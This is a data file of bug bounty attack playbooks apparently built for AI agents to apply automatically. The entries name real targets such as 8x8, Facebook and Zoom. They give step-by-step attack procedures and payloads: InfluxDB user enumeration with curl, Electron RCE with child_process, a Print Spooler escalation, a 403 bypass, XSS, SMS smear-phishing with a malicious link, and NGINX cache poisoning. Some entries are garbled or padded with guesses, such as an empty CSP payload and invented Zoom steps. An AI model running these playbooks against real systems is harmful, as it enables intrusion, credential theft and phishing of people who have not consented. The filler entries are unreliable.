description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.

meta.title: InfluxDB Access at redact.8x8.com

trigger_conditions.when_to_apply: This technique is applicable when an InfluxDB instance is accessible externally and its authentication is found to be disabled by default.
prerequisites: InfluxDB service is running and accessible on the target network.
applicability_signals: Shodan search for 'hostname:8x8.com' revealing InfluxDB service.
InfluxDB documentation indicating authentication is disabled by default.
skip_if: InfluxDB instance requires authentication and does not present a default unsecured configuration.

recon_steps: Use Shodan.io with the dork 'hostname:8x8.com' to identify potential InfluxDB services.
Research InfluxDB documentation to understand its authentication mechanisms and default configurations.
attack_steps: Send a GET request to the InfluxDB '/query' endpoint with a valid InfluxQL query to enumerate databases. Example: curl -G "http://<TARGET_URL>:8086/query" --data-urlencode 'q=show databases'
Send a GET request to the InfluxDB '/query' endpoint with a query to enumerate users. Example: curl -G "http://<TARGET_URL>:8086/query" --data-urlencode 'q=show users'
tools_recommended: Shodan.io for service discovery.
Curl for making HTTP requests.
Burp Suite to intercept and modify requests.
success_indicators: Receiving a list of databases when querying 'show databases'.
Receiving a list of users when querying 'show users'.
failure_indicators: Receiving a 401 Unauthorized or similar authentication error → InfluxDB authentication is enabled and requires credentials. Pivot to finding credentials or another vulnerability.
Receiving an empty response or an error indicating the query is invalid → The target might not be InfluxDB or the query syntax is incorrect for this version.

playbooks.impact: Attacker can read sensitive data such as database names and user credentials from the InfluxDB instance. This could lead to further compromise of systems relying on this data.
playbooks.key_lesson: Always check for default configurations and disabled authentication on exposed services, especially databases like InfluxDB.

meta.title: Disclosing wifi password via content provider injection in Xiaomi

trigger_conditions.when_to_apply: When an installed application on a Xiaomi device can interact with the system's content providers.
prerequisites: The target device must be a Xiaomi phone with a specific MIUI version (e.g., V10.3.13.0.PFHINXM on Redmi Note 7 Pro).
ADB (Android Debug Bridge) must be enabled and accessible on the device.
applicability_signals: Existence of a content provider accessible via `content://wifi/wifi` URI.
The ability to execute `drozer` commands on the device.
skip_if: If the content provider is properly secured with custom permissions.
If Wi-Fi passwords are stored in an encrypted format that cannot be decrypted by any application.

recon_steps: Step 1: Connect the target Xiaomi device to a machine with ADB enabled.
Step 2: Execute `adb shell getprop | grep -E "ro.miui.region|ro.build.fingerprint"` to identify the device model and MIUI version.
Step 3: Confirm the ability to run `drozer` commands by executing a simple command like `drozer help`.
attack_steps: Step 1: Execute the `drozer` command: `app.provider.query content://wifi/wifi` on the connected device.
Step 2: Observe the output for Wi-Fi credentials in cleartext.
tools_recommended: ADB (Android Debug Bridge): for device connection and command execution.
Drozer: for querying Android content providers.
success_indicators: The output of the `drozer` command contains saved Wi-Fi network names (SSIDs) and their corresponding passwords in cleartext.
failure_indicators: The `drozer` command fails to execute or returns an error indicating the content provider is not found or inaccessible.
The output does not contain Wi-Fi credentials in cleartext.

playbooks.impact: An attacker with the ability to run arbitrary applications on the device can gain access to all saved Wi-Fi credentials. This can allow them to connect to the victim's home or office networks, intercept network traffic, potentially alter DNS settings, and perform other malicious actions.
playbooks.key_lesson: Always secure Android Content Providers by implementing custom permissions or encrypting sensitive data, especially when they expose system-level information like network credentials.

meta.title: How recon helped me to find an interesting bug…

trigger_conditions.when_to_apply: When a target application uses MicroStrategy and exposes the /MicroStrategy/servlet/taskProc endpoint with a vulnerable srcURL parameter that accepts shortened URLs.
prerequisites: Discovery of the /MicroStrategy/servlet/taskProc endpoint.
The srcURL parameter in the taskProc servlet is intended to handle shortened URLs or redirects.
applicability_signals: The URL pattern `https://<subdomain>.target.com/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=` is observed.
skip_if: The srcURL parameter does not accept external URLs or only accepts internal references.
The application performs strict validation on the srcURL parameter, preventing any form of redirection.

recon_steps: Step 1: Enumerate subdomains using tools like subfinder and amass.
Step 2: Probe discovered subdomains with httpx to identify live hosts.
Step 3: Use nuclei with relevant templates to scan for known vulnerabilities, specifically looking for MicroStrategy related findings.
Step 4: Analyze results for the presence of the /MicroStrategy/servlet/taskProc endpoint.
attack_steps: Step 1: Navigate to the vulnerable endpoint: `https://<subdomain>.target.com/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=<shortened_url>`
Step 2: Attempt to redirect to a known external website (e.g., bing.com) by creating a shortened URL for it and placing it in the `srcURL` parameter.
Step 3: If open redirect is confirmed, attempt to exploit for XSS by creating a shortened URL for a page that executes JavaScript and placing it in the `srcURL` parameter.
Step 4: Observe the browser's behavior to confirm redirection or XSS execution.
tools_recommended: subfinder: For subdomain enumeration.
amass: For subdomain enumeration.
httpx: For live host probing.
nuclei: For vulnerability scanning with specific templates.
URL shortener service (e.g., bit.ly, tinyurl.com): To create shortened URLs for redirection targets.
success_indicators: The browser is redirected to the external website specified in the shortened `srcURL` parameter.
A Cross-Site Scripting (XSS) payload executes successfully when a shortened URL pointing to an XSS payload page is used in the `srcURL` parameter.
failure_indicators: No redirection occurs, or an error page is displayed. Pivot: Investigate if the `srcURL` parameter has other functionalities or if the application filters shortened URLs.
The application attempts to fetch content from the `srcURL` internally rather than redirecting. Pivot: This might indicate SSRF if external fetching is possible, or a limitation of the open redirect.

playbooks.impact: An attacker can redirect users to arbitrary external websites, potentially leading to phishing attacks, credential harvesting, or executing Cross-Site Scripting (XSS) attacks by redirecting to a malicious page.
playbooks.key_lesson: Always test URL parameters, especially those related to redirection or content fetching, with shortened URLs to bypass potential length restrictions or detection mechanisms.

meta.title: Open Sesame: Escalating Open Redirect to RCE with Electron Code Review

trigger_conditions.when_to_apply: When an Electron application can be decompiled and its source code reviewed, and if `nodeIntegration` is enabled, any client-side vulnerability can be escalated to RCE.
prerequisites: Electron application is available for download.
Application is packaged as an .asar archive.
applicability_signals: Presence of `app.asar` file in the application bundle.
Decompiled source code reveals `nodeIntegration: true` in `BrowserWindow` configurations.
Discovery of an Open Redirect or XSS vulnerability within the client-side code.
skip_if: Application is not built with Electron.
`nodeIntegration` is set to `false` and no other means of client-side code execution can be found.
CSP policies effectively block all script execution and no bypass is found.

recon_steps: Step 1: Download the target Electron application.
Step 2: Locate the `app.asar` file within the application's package contents (e.g., `AppName.app/Contents/Resources/app.asar` on macOS).
Step 3: Extract the `app.asar` archive using `npx asar extract app.asar <output_directory>` to obtain the source code.
Step 4: Review `package.json` for the 'main' entry point (e.g., `app/index.js`).
Step 5: Analyze the main process JavaScript file (e.g., `index.js`) for `BrowserWindow` configurations and check the `nodeIntegration` setting.
attack_steps: Step 1: If `nodeIntegration` is true, identify potential XSS or Open Redirect vulnerabilities by reviewing client-side code for insecure handling of user input or URL parameters.
Step 2: If an Open Redirect is found, attempt to craft a payload that redirects to a malicious site or URI that can trigger an XSS or exploit.
Step 3: If an XSS vulnerability is found, attempt to inject JavaScript that leverages `nodeIntegration` to execute arbitrary Node.js code.
Step 4: Use Electron's built-in Chromium DevTools (if accessible, or by re-enabling it via `globalShortcut`) to debug XSS payloads and analyze CSP.

Step 5: Once an XSS vector is confirmed with `nodeIntegration: true`, craft a Node.js payload to execute code, such as opening the calculator: `require('child_process').execFile('/Applications/Calculator.app/Contents/MacOS/Calculator', function() {})`.
payloads_or_patterns: JavaScript payload for RCE: `require('child_process').execFile('calc.exe', function(){})` (Windows) or `require('child_process').execFile('/Applications/Calculator.app/Contents/MacOS/Calculator', function(){})` (macOS)
XSS payload template: `<script>require('child_process').execFile('YOUR_COMMAND')</script>` (if `nodeIntegration` is true and CSP allows script execution)
tools_recommended: Node.js: for running `asar` utility.
asar CLI: to extract Electron application archives.
Burp Suite: to proxy and inspect network traffic, test for open redirects and XSS.
Electron Debugger: for live debugging of the Electron application.
success_indicators: Execution of arbitrary Node.js code within the Electron application context (e.g., calculator opening).
Successful redirection to a controlled external URL via an Open Redirect.
Execution of JavaScript alerts or console logs from injected XSS payloads.
failure_indicators: Inability to decompile `app.asar` (check if it's encrypted or a different format).
No `nodeIntegration: true` found or confirmed to be exploitable.
CSP policies block all script execution and no bypass is discovered.
XSS payloads fail to execute, even after enabling DevTools.
Open Redirects do not redirect to controllable endpoints.

playbooks.impact: Remote Code Execution (RCE) on the user's machine, allowing attackers to run arbitrary commands, access local files, and potentially compromise the entire system.
playbooks.key_lesson: Always decompile Electron applications and review source code for `nodeIntegration: true`. If found, any client-side vulnerability (like XSS or Open Redirect) can be escalated to RCE.

meta.title: From an Out-of-Scope Open Redirect to CVE-2020-1323

trigger_conditions.when_to_apply: This technique is applicable when an endpoint with a parameter containing 'redirect' is found, and the application uses Microsoft SharePoint.
prerequisites: Target application uses Microsoft SharePoint.
An endpoint with a parameter like 'redirect_uri' exists.
applicability_signals: Presence of an endpoint like 'appredirect.aspx'.
Existence of a parameter named 'redirect_uri' or similar.
skip_if: The 'appredirect.aspx' endpoint is not found or returns a forbidden status code.
Security measures on the endpoint effectively prevent redirection.

recon_steps: Step 1: Identify endpoints containing 'redirect' in their name or parameters, specifically looking for 'appredirect.aspx'.
Step 2: Analyze the parameters of identified endpoints, searching for parameters like 'redirect_uri' that accept URLs.
attack_steps: Step 1: Send a request to the vulnerable endpoint (e.g., GET /appredirect.aspx) with a crafted URL in the 'redirect_uri' parameter pointing to an attacker-controlled domain.
Step 2: Observe the HTTP response to confirm if a redirect occurs to the specified attacker-controlled URL.
Step 3: If a simple redirect is blocked, attempt to bypass security measures by fuzzing the 'redirect_uri' parameter with various open redirect payloads.
tools_recommended: Burp Suite: To intercept and modify requests, and to fuzz the 'redirect_uri' parameter.
Custom wordlists: For fuzzing open redirect vulnerabilities.
success_indicators: HTTP 302 Found response with the 'Location' header pointing to the attacker-controlled domain.
Successful execution of JavaScript or other malicious payloads on the attacker-controlled domain, triggered by the redirect.
failure_indicators: 403 Forbidden status code for the endpoint or parameter.
Redirect to a predefined safe page or the original application URL, indicating security controls are in place.
Error messages indicating invalid redirect URL.

playbooks.impact: Allows an attacker to redirect users to malicious websites, potentially leading to phishing attacks, credential theft, or further exploitation.
playbooks.key_lesson: Even seemingly low-impact vulnerabilities like open redirects can be chained with other misconfigurations or lead to more severe issues, warranting further investigation beyond initial reporting.

meta.title: CVE-2020-1337 – PrintDemon is dead, long live PrintDemon!

trigger_conditions.when_to_apply: When an unprivileged user can add printers and write to arbitrary file paths within the Windows Print Spooler service's context.
prerequisites: Attacker has unprivileged user access to a vulnerable Windows system.
The Windows Print Spooler service is running.
applicability_signals: The system is a Windows operating system (assumed).
The Print Spooler service is known to be vulnerable to arbitrary file writes.
skip_if: The Print Spooler service is not running.
The system is patched against CVE-2020-1337 and CVE-2020-1048.

recon_steps: Step 1: Confirm the Windows version and whether the Print Spooler service is running using system commands (e.g., `ver`, `sc query spooler`).
Step 2: Attempt to add a local printer with a custom port pointing to a sensitive system directory (e.g., `C:\Windows\System32\test.dll`) to check for initial access restrictions.
attack_steps: Step 1: Add a new printer using the Windows API (not the GUI) with a custom local port pointing to a sensitive file path in a privileged directory (e.g., `C:\Windows\System32\config\systemprofile\NTUSER.DAT`).
Step 2: Configure the printer's data type to 'RAW' using the `DOC_INFO_1` structure via the Windows API's `AddPrinterConnection` and `WritePrinter` functions to prevent payload mutilation.
Step 3: Print a payload (e.g., shellcode, malicious configuration) to the printer port. This initial write will likely fail with an error state.
Step 4: Trigger a restart of the Print Spooler service (requires admin privileges, so a local reboot or an exploit to restart the service might be needed) or reboot the system.
Step 5: Upon service restart/reboot, the Print Spooler service (running as SYSTEM) will process the shadow job file and write the payload to the target file with elevated privileges.
payloads_or_patterns: Payload to be written to `<TARGET_FILE_PATH>` (e.g., a DLL that grants shell access, a modified configuration file).
Printer port path: `C:\Windows\System32\config\systemprofile\NTUSER.DAT` (example, can vary for other sensitive files).
API calls: `AddPrinterConnection`, `WritePrinter`, `SetPrinter` (with `PRINTER_CONTROL_SET_SPOOL_DIR` or similar to influence shadow job file location if needed).
tools_recommended: Custom C/C++ exploit using Windows API for printer manipulation and `WritePrinter`.
PowerShell to trigger service restart (if the attacker has sufficient privileges to restart it, otherwise a separate privilege escalation is needed first) or to initiate a reboot.
Sysinternals Suite for system analysis.
success_indicators: The target file (e.g., `NTUSER.DAT`) is overwritten with the attacker's payload.
Subsequent actions by the SYSTEM user or a user logging into the system reflect the changes made by the payload (e.g., user receives elevated privileges, malicious process starts).
failure_indicators: The target file is not overwritten after service restart/reboot.
Access denied errors during initial printer port creation if the user lacks permissions to even create the port file. Suggestion: Explore other sensitive file paths or different TOCTOU vectors.
Payload mutilation if `DOC_INFO_1` with `pDatatype` as 'RAW' is not correctly implemented. Suggestion: Double-check API usage for `WritePrinter`.

playbooks.impact: Local privilege escalation to `NT AUTHORITY\SYSTEM` on the affected Windows machine, allowing the attacker to gain full control of the system.
playbooks.key_lesson: When dealing with Windows Print Spooler vulnerabilities, consider the behavior of shadow job files and the privileges of the Print Spooler service itself, especially after service restarts or reboots, to bypass initial file write restrictions.

meta.title: CVE-2020-11518: how I bruteforced my way into your Active Directory
meta.category: RCE, Insecure deserialization, Arbitrary file upload, Bruteforce

tech_stack_fingerprints: Zoho ManageEngine ADSelfService Plus login page

trigger_conditions.when_to_apply: When Zoho ManageEngine ADSelfService Plus is exposed externally and has the cewolf servlet enabled.
prerequisites: Target must be running Zoho ManageEngine ADSelfService Plus.
The cewolf servlet mapping to `/cewolf/*` must be present in `web.xml`.
applicability_signals: Presence of `/cewolf/*` servlet-mapping in `web.xml`.
The ability to access `http://<TARGET_URL>/cewolf/`.
skip_if: Target is not Zoho ManageEngine ADSelfService Plus.
The `/cewolf/*` servlet is not mapped or accessible.

recon_steps: Step 1: Use Aquatone or similar tools to identify subdomains with a similar-looking login page that might be Zoho ManageEngine ADSelfService Plus.
Step 2: Manually inspect the `web.xml` file (if accessible) or look for `/cewolf/` patterns in discovered endpoints to confirm the presence of the cewolf servlet.
attack_steps: Step 1: Send a GET request to `http://<TARGET_URL>/cewolf/?img=/../../../path/to/uploaded/evil.file` where `evil.file` is a file previously uploaded to the server.
Step 2: The vulnerability exploits Java deserialization via the `img` parameter in the `cewolf` servlet.

Step 3: To achieve RCE, an attacker would need to first find a way to upload an arbitrary file to the server, and then craft a Java deserialization payload within that file or a separate file that the `cewolf` servlet can process.
tools_recommended: Aquatone for subdomain reconnaissance.
Burp Suite for intercepting and modifying requests.
Java deserialization tools (e.g., ysoserial) to craft payloads if file upload is achieved.
success_indicators: Successful execution of arbitrary code on the server, confirmed by a callback to an attacker-controlled server or observable system changes.
Reading sensitive files from the server via the path traversal if the payload is designed for file reading instead of code execution.
failure_indicators: 404 Not Found for `/cewolf/` endpoint: The servlet is not deployed or accessible. Try other attack vectors.
403 Forbidden: A WAF might be blocking the request. Obfuscate the path or try different file paths.
Error messages indicating invalid image file or deserialization failure: The payload might be malformed or the file upload failed. Re-verify file upload functionality and payload structure.

playbooks.impact: Remote Code Execution (RCE) on the server, leading to full compromise of the Active Directory-linked system.
playbooks.key_lesson: Always investigate Java deserialization vulnerabilities in web application endpoints, especially when combined with path traversal or file upload functionalities.

meta.title: CSP Bypass Vulnerability in Google Chrome Discovered

affected_components: Content Security Policy (CSP) implementation in Google Chrome

trigger_conditions.when_to_apply: When a website implements a Content Security Policy (CSP) that can be bypassed by manipulating specific directives or attributes.
prerequisites: The target website must implement a Content Security Policy (CSP).
applicability_signals: Observing a Content-Security-Policy header in the HTTP response.
Analyzing the CSP directives for potential weaknesses such as `script-src` or `default-src` configurations.
skip_if: The CSP is configured with strict `'nonce-'` or `'sha256-'` values for inline scripts.
The CSP explicitly disallows all external scripts or inline scripts.

recon_steps: Step 1: Analyze the HTTP response headers of the target website to identify the presence and configuration of the 'Content-Security-Policy' header.

Step 2: Examine the directives within the CSP header, paying close attention to `script-src`, `default-src`, `style-src`, and `object-src` for potential misconfigurations or overly permissive settings.
attack_steps: Step 1: Craft an HTML payload that leverages the identified CSP bypass technique. This might involve using specific attributes or URL formats that are not properly sanitized by the browser's CSP parser.
Step 2: Inject the crafted payload into a vulnerable input field on the target website. This could be a reflected XSS vulnerability or any other input that renders HTML.
Step 3: Observe the browser's behavior and the execution of the injected script, confirming if the CSP restrictions were bypassed.
payloads_or_patterns: The writeup describes a general bypass technique involving the manipulation of CSP directives and attributes, but does not provide specific, reusable payloads. The technique likely involves exploiting specific parser behaviors or directive interpretations, which would require detailed analysis of the targeted CSP configuration.
A generic example might look like `` if `img-src` is not restricted and `onerror` is allowed, or exploiting `unsafe-inline` or `unsafe-eval` if present.
tools_recommended: Browser Developer Tools: To inspect CSP headers and observe script execution.
Burp Suite or similar proxy: To intercept and modify HTTP requests and responses, particularly to analyze CSP headers.
success_indicators: Execution of JavaScript code that should have been blocked by the CSP (e.g., an `alert()` box appearing, a request being sent to an unauthorized domain).
The browser console not showing any CSP violation errors for the executed script.
failure_indicators: CSP violation errors appearing in the browser console, indicating the script was blocked.
The injected payload not being rendered or executed as intended.

playbooks.impact: Execution of arbitrary JavaScript code on the target website, leading to potential XSS, data theft, session hijacking, or further compromise of the user's browser.
playbooks.key_lesson: Always rigorously test Content Security Policy (CSP) implementations for specific bypass vectors by analyzing directive configurations and browser parsing behaviors, as general CSP rules can have subtle weaknesses.

meta.title: Bypassing 403 using X-Forwarded-For header with 127.0.0.1

target_profile.technology: Web applications behind reverse proxies or load balancers
affected_components: Endpoints/services blocked by a 403 Forbidden response
tech_stack_fingerprints: Responses with 403 status code for normally restricted content
Presence of reverse proxies or load balancers (inferred from XFF behavior)

trigger_conditions.when_to_apply: When an attacker encounters a 403 Forbidden response for a resource that might be accessible from the server's internal network or by the server itself.
prerequisites: The target application must be deployed behind a reverse proxy or load balancer that processes the X-Forwarded-For header.
The target application must interpret the X-Forwarded-For header value of '127.0.0.1' or similar localhost IPs as an indicator of an internal or authorized request.
applicability_signals: Receiving a 403 Forbidden status code for a specific endpoint or resource.
Observing that the application is configured to trust or process the X-Forwarded-For header.
skip_if: The application consistently returns 403 regardless of the X-Forwarded-For header value.
The application does not appear to be behind a reverse proxy or load balancer.
A Web Application Firewall (WAF) actively blocks requests with modified X-Forwarded-For headers.

recon_steps: Step 1: Identify endpoints or resources that return a 403 Forbidden status code.
Step 2: Attempt to access these endpoints without any special headers to confirm the 403 response.
attack_steps: Step 1: Send an HTTP request to the target endpoint with the 'X-Forwarded-For' header set to '127.0.0.1'. Example: `GET /admin-console HTTP/1.1` with `X-Forwarded-For: 127.0.0.1`.
Step 2: If the initial attempt is successful (e.g., returns a 200 OK or a different status code than 403), verify if sensitive information or administrative functions are now accessible.
Step 3: If '127.0.0.1' is blocked or ineffective, attempt variations of localhost IPs like 'localhost', '127.0.0.1:80', '127.0.0.1:443', or other internal-looking IP addresses if enumerated.
Step 4: For organizations with many subdomains, automate the process of testing each subdomain with the modified X-Forwarded-For header.
tools_recommended: Burp Suite Repeater: For manually crafting and sending requests with modified headers.
Custom script (Python, Go): To automate testing across multiple subdomains or endpoints with various XFF payloads.
success_indicators: Receiving a 200 OK status code instead of a 403 Forbidden.
Access to administrative consoles, internal panels, or sensitive data that was previously denied.
The response body contains content that was not visible when the request returned a 403.
failure_indicators: The request continues to return a 403 Forbidden status code.
The application returns an error indicating a malformed or invalid request.
A WAF blocks the request with a 403 or other blocking response code.
The response shows no difference in content or access level compared to a request without the XFF header.

playbooks.impact: Access to restricted administrative consoles, internal services, APIs, or sensitive data that is normally blocked to external users. This can lead to further exploitation, data breaches, or system compromise.
playbooks.key_lesson: Always test endpoints that return a 403 Forbidden response by manipulating the X-Forwarded-For header with internal IP addresses like '127.0.0.1' to bypass access controls, especially on applications behind reverse proxies or load balancers.

meta.title: Zoom Exposed Public Kerberos Authentication Server Memory Leak on Zoom Production Server

affected_components: API belonging to Zoom production infrastructure

trigger_conditions.when_to_apply: When an API endpoint belonging to Zoom's production infrastructure is identified and accessible. The specific vulnerability involves a memory leak within this API.
prerequisites: Discovery of an API endpoint related to Zoom's production infrastructure.
applicability_signals: Target system is Zoom's production infrastructure.
An API endpoint is identified.
skip_if: No accessible API endpoints related to Zoom's production infrastructure are found.

recon_steps: Step 1: Identify accessible API endpoints belonging to Zoom's production infrastructure.
Step 2: Analyze network traffic and application behavior for anomalies that could indicate a memory leak.
attack_steps: Step 1: Send requests to the identified API endpoints to trigger potential memory leak conditions. Specific request payloads or parameters are not detailed in the writeup.
Step 2: Monitor the API endpoint for unusual memory consumption patterns or disclosures of sensitive information that could result from a memory leak.
Step 3: If a memory leak is suspected, attempt to trigger it repeatedly to confirm the vulnerability and potentially extract more data.
tools_recommended: Network traffic analysis tools (e.g., Wireshark)
System monitoring tools to observe memory usage
success_indicators: Observation of sensitive information being disclosed in API responses that would not typically be present, indicating memory leakage.
Sustained high memory usage by the API process after repeated requests.
failure_indicators: API responses are consistent and do not reveal any unexpected or sensitive data.
No significant increase in memory consumption is observed on the server-side.
A 4xx or 5xx error is returned for all tested requests, indicating the endpoint might not be active or is heavily protected.

playbooks.impact: Disclosure of sensitive information that may be present in the memory of the Zoom production server's API, potentially including user data, internal configurations, or other confidential information.
playbooks.key_lesson: Thoroughly analyze API endpoints for memory leak vulnerabilities by sending various request types and monitoring for unexpected data disclosure.

meta.title: Reflected XSS in Facebook’s mirror websites

trigger_conditions.when_to_apply: When a Facebook mirror subdomain is found to host a /.layout/header.php endpoint that reflects user input within an anchor tag's href attribute, especially if input is url-encoded.
prerequisites: Discovery of a Facebook mirror subdomain.
applicability_signals: The presence of the /.layout/header.php endpoint on a mirror subdomain.
The response HTML contains the reflected input within an `href` attribute of an `<a>` tag.
User input appears to be url-encoded in the response.
skip_if: The /.layout/header.php endpoint is not found.
User input is not reflected in an `href` attribute.
No apparent method to break out of the `href` attribute's single quotes or execute JavaScript.

recon_steps: Step 1: Enumerate subdomains for target domains like 'thefacebook.com' using tools like Findomain, Subfinder, Assetfinder.
Step 2: Use httprobe to filter live subdomains.
Step 3: Use ffuf with common directory wordlists (e.g., 'dir.txt') on live subdomains to discover directories like '/.layout'.
Step 4: Directory bruteforce on discovered directories (e.g., '/.layout') to find files like 'header.php'.
Step 5: Analyze the source code of discovered files (e.g., 'header.php') to identify reflected user input, especially within `href` attributes.
attack_steps: Step 1: Construct a URL to the vulnerable endpoint, e.g., `http://mirror-ext.glbx.thefacebook.com/.layout/header.php`.
Step 2: Append a payload designed to break out of the `href` attribute and execute JavaScript. Based on the writeup, this involves a specific sequence to manipulate the `href` value.
Step 3: Test the crafted URL to observe the reflected output and check for XSS execution.
tools_recommended: Findomain, Subfinder, Assetfinder for subdomain enumeration.
httprobe for live subdomain filtering.
ffuf for directory and file bruteforcing.
Browser's developer tools to analyze HTML source code and network requests.
success_indicators: An alert box pops up displaying the domain name (e.g., 'alert(document.domain)').
The crafted payload successfully modifies the `href` attribute to execute JavaScript.
The target page reflects the injected payload without returning a 'not found' error, indicating that the additional path segments are handled.
failure_indicators: A '404 Not Found' error is returned when appending characters like '>' or '<'.
The payload is not reflected or is improperly sanitized, preventing JavaScript execution.
Input is reflected but is not within an `href` attribute or cannot be exploited due to surrounding code structure. Suggestion: Look for other reflection points or different XSS vectors.

playbooks.impact: Execution of arbitrary JavaScript in the context of the vulnerable Facebook mirror website. This could lead to session hijacking, data theft from the user's browser interacting with the mirror site, or further attacks on users who visit the mirror site.
playbooks.key_lesson: When input is reflected within an `href` attribute, investigate techniques to break out of the attribute's quotes and execute JavaScript, especially if input is url-encoded or a specific path traversal is possible.

meta.title: The feature works as intended, but what’s in the source?

trigger_conditions.when_to_apply: When a feature explicitly states that certain personal information (like address) will be shared with a list creator, and the attacker is a user who interacts with this feature.
prerequisites: Attacker must be an authenticated user.
Attacker must have interacted with a feature that shares specific data (e.g., purchased a gift from a list).
applicability_signals: Presence of a feature that shares user-provided data with another party.
Documentation or UI messaging that describes what data is shared.
skip_if: No features are present that involve sharing user data.
All user-provided data is properly sanitized and no additional information is exposed in the source.

recon_steps: Step 1: Identify features that involve sharing user data with other users or parties.
Step 2: Interact with the identified feature (e.g., purchase an item from a list, subscribe to a newsletter) to trigger the data sharing mechanism.
Step 3: Analyze the HTML source code of pages that display information related to the feature, particularly pages viewed by the recipient of the shared data.
attack_steps: Step 1: As an authenticated user, interact with the target feature (e.g., purchase a gift from a list).
Step 2: Access the view where the recipient (list creator in the writeup) sees the shared information (e.g., the 'Thank you' list).
Step 3: View the HTML source code of this page (e.g., using 'view-source:').
Step 4: Search the HTML source for the attacker's own identifying information (e.g., email address) or other sensitive data that was *not* explicitly stated to be shared.
payloads_or_patterns: Search queries within HTML source: e.g., search for '@googlemail.com', '<attacker_email>'
tools_recommended: Browser Developer Tools (View Source functionality)
Browser Search (Ctrl+F)
success_indicators: Finding sensitive information in the HTML source that was not explicitly communicated as being shared (e.g., attacker's email address found when only address was stated to be shared).
failure_indicators: No additional sensitive information found in the HTML source beyond what was explicitly stated to be shared. In this case, pivot to other vulnerabilities like XSS or IDOR if not already tested.

playbooks.impact: Exposure of sensitive user information (e.g., email addresses) to unintended recipients, even when the feature is functioning as described regarding other data points. This violates user privacy and can lead to further targeted attacks.
playbooks.key_lesson: Always review the HTML source and client-side JavaScript for unintended data leakage, even when a feature's primary functionality appears to be working as intended and is explicitly documented.

meta.title: Smear phishing: a new Android vulnerability

trigger_conditions.when_to_apply: When an attacker can send SMS messages to an Android device and has a known phone number that exists as a contact on the victim's device.
prerequisites: Attacker can send SMS messages to the target device.
Victim's phone has a contact saved with a phone number that matches the numeric part of a spoofed Sender ID, potentially with a leading non-numeric character.
Victim uses an Android device with potentially vulnerable SMS handling.
applicability_signals: Observable behavior of SMS messages appearing in existing conversation threads rather than new ones.
Appearing to be from a known contact instead of an arbitrary sender ID.
skip_if: The SMS appears in a new conversation thread.
The sender ID is clearly displayed as an arbitrary alphanumeric string (e.g., 'Twitter') and not attempting to spoof a numeric number.
The device is an iPhone, which reportedly handles sender IDs differently and is not vulnerable to this specific manipulation.

recon_steps: Step 1: Identify a target Android user's phone number and verify SMS reception.
Step 2: Determine if the target user has specific contacts saved on their device that could be impersonated.
Step 3: Experiment with sending SMS messages using known SMS gateways that allow custom alphanumeric Sender IDs.
attack_steps: Step 1: Choose a known contact on the victim's phone (e.g., a friend, family member, or a CEO if targeting a corporate breach). Obtain their phone number.

Step 2: Craft an SMS message. In the Sender ID field, use the numeric part of the contact's phone number, but prepend it with a non-numeric character (e.g., 'O' instead of '0' for a number starting with 0). For example, if the contact's number is +447890123456, use 'O7890123456' as the Sender ID.
Step 3: Send the crafted SMS message to the target Android device using an SMS gateway that permits custom Sender IDs.
Step 4: Observe if the received SMS appears within the existing conversation thread of the spoofed contact, rather than a new thread.
Step 5: Instruct the victim to interact with the message, for example, by clicking a link within the message, to initiate a phishing or further attack.
payloads_or_patterns: Example: Sender ID: O7890123456 (if target contact's number is +447890123456)
Message Body: 'Hey, can you click this link to help me out? <malicious_url>'
tools_recommended: SMS gateway service (e.g., ClickSend, Twilio) that allows custom Sender IDs.
Vulnerability scanning tool or manual testing to identify users with specific contact patterns.
success_indicators: The received SMS message appears in the existing conversation thread with the spoofed contact.
The message details show the sender as the actual phone number of the contact (e.g., '+447890123456') rather than the alphanumeric Sender ID.
The victim interacts with the malicious link or content within the message.
failure_indicators: The SMS message appears in a new conversation thread with the spoofed alphanumeric Sender ID.
The message details show the sender as the alphanumeric Sender ID and not a phone number.
The SMS gateway rejects the Sender ID due to invalid characters or format.

playbooks.impact: An attacker can trick an Android user into believing an SMS message is from a trusted contact, enabling sophisticated phishing attacks, social engineering, and potentially leading to account compromise or data theft. This was demonstrated to be capable of facilitating large-scale account compromises in previous incidents.
playbooks.key_lesson: Android's SMS parsing should strictly validate Sender IDs and prevent the implicit conversion of alphanumeric strings to numeric phone numbers that match existing contacts, especially when these strings are crafted to mimic phone numbers with minor alterations.

meta.title: The Case of the Missing Cache Keys

affected_components: NGINX caching configuration, specifically proxy_cache_methods and proxy_cache_key
tech_stack_fingerprints: NGINX server detected via HTTP headers

trigger_conditions.when_to_apply: When NGINX is configured to cache responses for POST requests (via proxy_cache_methods) but the request body is not included in the cache key (proxy_cache_key). This is often due to optimizing for performance without fully considering cache key implications.
prerequisites: Target uses NGINX as a web server or reverse proxy.
NGINX is configured to cache POST requests.
The `proxy_cache_key` directive does not include `$request_body` or a similar mechanism that accounts for the request body.
applicability_signals: Presence of `proxy_cache_methods` allowing POST, PUT, DELETE etc. in NGINX config.
Absence of `$request_body` or similar in `proxy_cache_key` directive.
A vulnerable endpoint that is accessible via both GET and POST requests and reflects unsanitized input from the request body into the response.
skip_if: NGINX is not used or not configured for caching.
NGINX is configured to include request body in cache key.
The target application does not reflect any part of the request body into the response in a way that can be leveraged for XSS or other client-side attacks.

recon_steps: Step 1: Identify NGINX usage via HTTP headers (e.g., 'Server: nginx')
Step 2: Inspect NGINX configuration for `proxy_cache_methods` and `proxy_cache_key` directives if possible (though this is often not directly observable)
Step 3: Test an endpoint with a GET request and then a POST request with a unique payload in the body. Observe if the GET request's response is affected by the POST request's body content.
attack_steps: Step 1: Identify an endpoint that accepts POST requests and reflects a portion of the request body into the response (e.g., a search functionality, a form submission handler).

Step 2: Craft a malicious POST request to the identified endpoint with an XSS payload in the request body. For example: `POST /vulnerable_endpoint HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/x-www-form-urlencoded

<param_name>=<script>alert(1)</script>`

Step 3: Immediately after sending the malicious POST request, send a standard GET request to the same endpoint (without a request body). For example: `GET /vulnerable_endpoint HTTP/1.1
Host: <TARGET_URL>

`
Step 4: Observe the response to the GET request. If the XSS payload from the POST request's body is reflected in the GET request's response, cache poisoning is successful.
